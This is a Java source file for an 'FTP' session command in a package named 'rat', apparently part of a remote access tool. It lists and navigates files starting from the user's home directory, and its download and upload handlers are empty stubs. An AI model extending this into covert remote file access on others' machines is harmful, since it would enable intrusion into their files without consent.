package main.java.rat.command.clientCommands;

import main.java.rat.Utils;
import main.java.rat.command.ClientCommand;
import main.java.rat.command.SessionCommand;

import java.io.File;
import java.io.IOException;
import java.nio.file.Path;
import java.nio.file.Paths;

public class ClientFTPCommand extends ClientCommand implements SessionCommand {
    boolean inSession = false;
    File currentDir = null;

    @Override
    public String getMainCommandName() {
        return "FTP";
    }

    @Override
    public String getHelpText() {
        return "Start FTP session, where files can be listed, downloaded or uploaded. 'exit' can be used to exit.";
    }

    @Override
    public String getExtendedHelpText() {
        return getHelpText() + "\n" + usageText();
    }

    private String usageText() {
        return "Usage while in FTP:\n" +
                "'cd ../' - change directory, in this case up\n" +
                "'cd folder' - change directory, in this inside a folder\n" +
                "'download' - open the download dialog\n" +
                "'upload' - open the upload dialog\n" +
                "'exit' - exit FTP session";
    }

    @Override
    public boolean executeCommand() {
        logger.log(usageText()+"\n");
        currentDir = new File(System.getProperty("user.home"));
        inSession = true;
        environment.state.setInSession(true);

        listFiles();

        return true;
    }

    private void listFiles() {
        logger.log(currentDir.getAbsolutePath()+":");
        for(File file : currentDir.listFiles()) {
            logger.log("\t"+
                    (file.isDirectory() ? "DIRECTORY" : "FILE, " +
                            Utils.readableByteSize(file.length())) + "\t"+
                    file.getName()
            );
        }
    }

    @Override
    public String getExitString() {
        return "exit";
    }

    @Override
    public void receivedInput(String command) {
        if(command.toLowerCase().indexOf("cd ") == 0) {
            command = command.replace("cd ", "");

            Path filePath = Paths.get(currentDir.getAbsolutePath(), command);

            try {
                String normalPath = (new File(filePath.toString())).getCanonicalPath();
                currentDir = new File(normalPath);

                listFiles();
            } catch (IOException e) {
                logger.log(e.getMessage());
                e.printStackTrace();
            }

        } else if(command.equalsIgnoreCase("download")) {

        } else if(command.equalsIgnoreCase("upload")) {

        }

    }

    @Override
    public boolean isInSession() {
        return inSession;
    }

    @Override
    public void exit() {
        inSession = false;
        environment.state.setInSession(false);
        logger.log("Exiting FTP...");
    }
}
